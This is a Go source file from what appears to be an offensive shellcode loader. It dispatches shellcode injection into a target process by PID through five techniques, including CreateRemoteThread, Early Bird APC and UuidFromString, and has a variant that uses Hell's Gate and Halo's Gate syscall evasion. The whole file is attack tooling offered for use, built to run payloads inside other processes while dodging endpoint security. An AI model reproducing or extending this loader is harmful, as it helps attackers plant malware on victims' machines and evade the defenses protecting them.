package core

import (
  "os"
  "fmt"
  "strings"
)

var techniques = []string{"CreateRemoteThread", "Fibers", "CreateProcess", "EarlyBirdApc", "UuidFromString"}

func Inject(shellcode []byte, technique string, pid int) (error) {

  // Check especified injection technique
  if (strings.ToLower(technique) == "createremotethread") {
    err := CreateRemoteThread(shellcode, pid)
    if err != nil { // Handle error
      return err
    }

  } else if (strings.ToLower(technique) == "fibers") {
    err := Fibers(shellcode, pid)
    if err != nil { // Handle error
      return err
    }

  } else if (strings.ToLower(technique) == "createprocess") {
    err := CreateProcess(shellcode, pid)
    if err != nil { // Handle error
      return err
    }

  } else if (strings.ToLower(technique) == "earlybirdapc") {
    err := EarlyBirdApc(shellcode, pid)
    if err != nil { // Handle error
      return err
    }

  } else if (strings.ToLower(technique) == "uuidfromstring"){
    err := UuidFromString(shellcode, pid)
    if err != nil {
      return err
    }

  } else {
    rand_n := RandomInt(4, 0) // Choose a random technique
    fmt.Println("[*] Injecting shellcode using " + techniques[rand_n] + " function")
    err := Inject(shellcode, techniques[rand_n], pid)
    if err != nil { // Handle error
      return err
    }
  }

  return nil
}

func InjectHalos(shellcode []byte, technique string, pid int) (error) {
  if (strings.ToLower(technique) == "createprocess") {
    err := CreateProcessHalos(shellcode, pid)
    if err != nil {
      return err
    }

  } else if (strings.ToLower(technique) == "createremotethread") {
    err := CreateRemoteThreadHalos(shellcode, pid)
    if err != nil {
      return err
    }

  } else if (strings.ToLower(technique) == "earlybirdapc") || (strings.ToLower(technique) == "uuidfromstring") || (strings.ToLower(technique) == "fibers") {
    fmt.Println("[-] Injection technique not supported with Hell's Gate + Halo's Gate")
    os.Exit(0)

  } else {
    rand_n := RandomInt(4, 0)
    fmt.Println("[*] Injecting shellcode using " + techniques[rand_n] + " function")
    err := InjectHalos(shellcode, techniques[rand_n], pid)
    if err != nil {
      return err
    }
  }

  return nil
}


